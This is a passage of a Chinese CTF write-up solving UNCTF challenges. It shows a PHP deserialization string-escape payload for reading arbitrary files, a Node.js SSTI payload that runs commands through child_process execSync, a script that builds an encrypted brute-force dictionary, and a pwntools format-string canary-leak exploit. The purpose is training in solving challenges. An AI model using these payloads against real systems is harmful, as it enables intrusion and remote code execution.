<code>getShell()</code>，而调用类 <code>me7eorite</code> 的 <code>getShell()</code>，再控制 <code>$this-&gt;safe</code> 可任意读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> me7eorite;</span><br><span class="line"><span class="variable">$x</span>-&gt;safe = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;class = <span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:1:&quot;y&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>由于能POST传入的只有序列化部分的类 <code>UNCTF</code> 参数，可以通过给 <code>name</code> 传入恶意序列化字符串，<code>serialize()</code> 后截断正常的序列化字符串；给<code>email</code> 传入过滤关键字，<code>filter()</code> 之后使原有长度值与需去除的正常字符串长度相等，保留恶意序列化字符串，最后经 <code>unserialize()</code> 控制反序列化过程完成利用链。</p><p>尝试传值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:6:&quot;phpphp&quot;;s:4:&quot;name&quot;;s:245:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:11:&quot;/etc/passwd&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断</span></span><br></pre></td></tr></table></figure><p>计算需去除的正常字符串 <code>&quot;;s:4:&quot;name&quot;;s:245:&quot;z</code> 长度为21，则使得原有长度值与需去除的正常字符串长度相等，则需要 <code>21/len(&#39;php&#39;)=21/3=7</code> 个 <code>php</code> ，再将 <code>/etc/passwd</code> 换成 <code>/flag</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="variable">$email</span> = <span class="string">&#x27;phpphpphpphpphpphpphp&#x27;</span>;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> UNCTF(<span class="variable">$pass</span>,<span class="variable">$email</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:1:&quot;x&quot;;s:5:&quot;email&quot;;s:21:&quot;phpphpphpphpphpphpphp&quot;;s:4:&quot;name&quot;;s:231:&quot;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;【&quot;;&#125;z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;】截断</span></span><br></pre></td></tr></table></figure><p>注意 <code>flag</code> 也被过滤，双写绕过即可。</p><p>Payload：</p><p><code>http://xxx?a[]=1&amp;b[]=2</code>，POST传参 </p><p><code>name=z&quot;;s:4:&quot;name&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:9:&quot;me7eorite&quot;:2:&#123;s:4:&quot;safe&quot;;s:5:&quot;/flflagag&quot;;s:5:&quot;class&quot;;O:5:&quot;UNCTF&quot;:3:&#123;s:4:&quot;pass&quot;;s:9:&quot;me7eorite&quot;;s:5:&quot;email&quot;;s:16:&quot;me7eorite@qq.com&quot;;s:4:&quot;name&quot;;s:9:&quot;me7eorite&quot;;&#125;&#125;&#125;&#125;&amp;pass=x&amp;email=phpphpphpphpphpphpphp</code></p><p>flag：<code>UNCTF&#123;bc9b3f89-bed6-4bc3-a211-b9eed8612af7&#125;</code></p><p>​    </p><h3 id="nodejs-ssti"><a href="#nodejs-ssti" class="headerlink" title="nodejs_ssti"></a>nodejs_ssti</h3><p>一个输入框和提交按钮，尝试SSTI输入 <code>&#123;&#123;2*3&#125;&#125;</code> ，发现利用点在title值。</p><p>尝试 <code>&#123;&#123;print(xx)&#125;&#125;</code> 出现报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: getValue(...) is not a function</span><br><span class="line">    at sodaExp (eval at getEvalFunc (/app/node_modules/sodajs/dist/soda.js:266:28), &lt;anonymous&gt;:1:63)</span><br><span class="line">    at Soda.parseSodaExpression (/app/node_modules/sodajs/dist/soda.js:403:42)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:188:44</span><br><span class="line">    at String.replace (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:187:53)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:257:21</span><br><span class="line">    at Array.map (&lt;anonymous&gt;)</span><br><span class="line">    at compile (/app/node_modules/sodajs/dist/soda.js:256:55)</span><br><span class="line">    at Soda.compileNode (/app/node_modules/sodajs/dist/soda.js:261:13)</span><br><span class="line">    at /app/node_modules/sodajs/dist/soda.js:130:23</span><br></pre></td></tr></table></figure><p>说明代码使用的是soda.js，实际是node.js注入，利用node.js特性使用 <code>child_process</code> 调用 <code>execSync()</code> 方法RCE。</p><p>Payload：</p><p><code>http://xxx/who</code></p><p>POST传参 <code>name=&#123;&#123;" ".toString.constructor("return global.process.mainModule.constructor._load('child_process').execSync('cat /flag').toString()")()&#125;&#125;&amp;brand=web</code></p><p>flag：<code>UNCTF&#123;45d9452b-630a-4ffa-b963-f0da57cf0e79&#125;</code></p><p>​    </p><h3 id="encrypt-login"><a href="#encrypt-login" class="headerlink" title="encrypt_login"></a>encrypt_login</h3><blockquote><p>听说你很擅长撞库？</p></blockquote><p>随便输入用户名密码，返回提示密码为纯数字：</p><p><code>I can tell you my name is admin and my password is made by number only. This time, you can not to buster my password :)</code></p><p>查看源码发现前端加密js文件 <code>encrypto.js</code>，代码已混淆，根据 <code>jsjiami.com.v6</code> 字样，使用 <a href="https://jsdec.js.org/">JSDec</a> 在线解混淆有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Progcessed By JSDec in 0.01s</span></span><br><span class="line"><span class="comment"> *JSDec - JSDec.js.org</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$(<span class="string">&#x27;#submit&#x27;</span>)[<span class="string">&#x27;click&#x27;</span>](<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x326c0f = &#123;</span><br><span class="line">        <span class="string">&#x27;DTeqY&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1553aa, _0x4bb167</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1553aa == _0x4bb167;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;IeKGb&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x2ec083, _0x47b18b, _0x120b6a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x2ec083(_0x47b18b, _0x120b6a);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;foePj&#x27;</span>: <span class="string">&#x27;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU\nWXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE\nHzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr\nKJVXPMuQVgrw/SxkBQIDAQAB\n-----END PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iaWKq&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1c6939, _0x219dc9</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x1c6939 + _0x219dc9;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;PUpKG&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x213ed6, _0xe318d3</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x213ed6 + _0xe318d3;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;JNTjF&#x27;</span>: <span class="string">&#x27;#username&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;OSnwF&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0xd115dc, _0x2bfff6</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0xd115dc(_0x2bfff6);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bZMhU&#x27;</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;otSyR&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x486713, _0x17d2bc</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> _0x486713 + _0x17d2bc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> _0x5182d1 = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">    <span class="keyword">let</span> _0x20b0a1 = _0x326c0f[<span class="string">&#x27;foePj&#x27;</span>];</span><br><span class="line">    _0x5182d1[<span class="string">&#x27;setPublicKey&#x27;</span>](_0x20b0a1);</span><br><span class="line">    <span class="keyword">var</span> _0x4833f6 = _0x5182d1[<span class="string">&#x27;encrypt&#x27;</span>](_0x326c0f[<span class="string">&#x27;iaWKq&#x27;</span>](_0x326c0f[<span class="string">&#x27;PUpKG&#x27;</span>]($(_0x326c0f[<span class="string">&#x27;JNTjF&#x27;</span>])[<span class="string">&#x27;val&#x27;</span>](), <span class="string">&#x27;|-|&#x27;</span>), _0x326c0f[<span class="string">&#x27;OSnwF&#x27;</span>]($, <span class="string">&#x27;#password&#x27;</span>)[<span class="string">&#x27;val&#x27;</span>]()));</span><br><span class="line">    $[<span class="string">&#x27;ajax&#x27;</span>](&#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;login.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>: _0x326c0f[<span class="string">&#x27;bZMhU&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: _0x326c0f[<span class="string">&#x27;otSyR&#x27;</span>](<span class="string">&#x27;data=&#x27;</span>, _0x4833f6),</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span>: <span class="function"><span class="keyword">function</span>(<span class="params">_0x1626c4</span>) </span>&#123;</span><br><span class="line">            coco[<span class="string">&#x27;alert&#x27;</span>](&#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;鎻愮ず&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: _0x1626c4</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (_0x326c0f[<span class="string">&#x27;DTeqY&#x27;</span>](_0x1626c4, <span class="string">&#x27;登录成功&#x27;</span>)) &#123;</span><br><span class="line">                _0x326c0f[<span class="string">&#x27;IeKGb&#x27;</span>](<span class="built_in">setTimeout</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    location[<span class="string">&#x27;reload&#x27;</span>]();</span><br><span class="line">                &#125;, <span class="number">0x3e8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);;</span><br><span class="line">_0xod5 = <span class="string">&#x27;jsjiami.com.v6&#x27;</span></span><br></pre></td></tr></table></figure><p>分析发现，前端输入的账号密码，以 <code>username|-|password</code> 的方式组合后，再经RSA加密得到base64密文。</p><p>生成爆破用字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&#x27;&#x27;&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD6US5bbJ7JrsKYeSa8goPJQBgU</span></span><br><span class="line"><span class="string">WXdNyUxtPfcwuCrsYEcWNdnk1fpIdSfUvrku39fYl+h1ciyanp5H79uSzuqsUrPE</span></span><br><span class="line"><span class="string">Hzb2y+GTqdmNzZ53JPcxrFlYMv3NX0EOk3qMzgcSV/qXcAc+fWxLSTV5OVeWV8Lr</span></span><br><span class="line"><span class="string">KJVXPMuQVgrw/SxkBQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10000</span>)):</span><br><span class="line">password = <span class="built_in">str</span>(i)</span><br><span class="line">m = <span class="string">&#x27;admin|-|&#x27;</span> + password</span><br><span class="line">rsakey = RSA.importKey(public_key)</span><br><span class="line">cipher = Cipher_pkcs1_v1_5.new(rsakey)</span><br><span class="line">cipher_text = base64.b64encode(cipher.encrypt(m))</span><br><span class="line">f.write(cipher_text+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后上Burpsuite，加载新字典dict.txt，爆破拿到flag。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="# Pwn"></a># Pwn</h2><h3 id="fo"><a href="#fo" class="headerlink" title="fo"></a>fo</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  speaking();</span><br><span class="line">  leak();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">speaking</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(</span><br><span class="line">           <span class="string">&quot;Do you know the format string?\n&quot;</span></span><br><span class="line">           <span class="string">&quot;           you can message at here:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;            https://wiki.x10sec.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">leak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;I heared that you are interested in the CTF.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;           I hope that you will hold on to keep your interest\n&quot;</span></span><br><span class="line">    <span class="string">&quot;          tell me,will you?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will remember what you said&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wait for your good news...&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec发现存在canary，利用<code>leak()</code> 中存在的格式化字符串漏洞泄露canary，再实现ret2text。</p><p>Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">38793</span>)</span><br><span class="line"></span><br><span class="line">[r.recvline() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;%17$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(r.recvline().strip()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">backdoor_addr = <span class="number">0x40080D</span></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(backdoor_addr)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know the ShellCode?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n---------^-^----------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;show me your Migic&quot;</span>);</span><br><span class="line">  read_shell_code();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you finished?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;~Bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 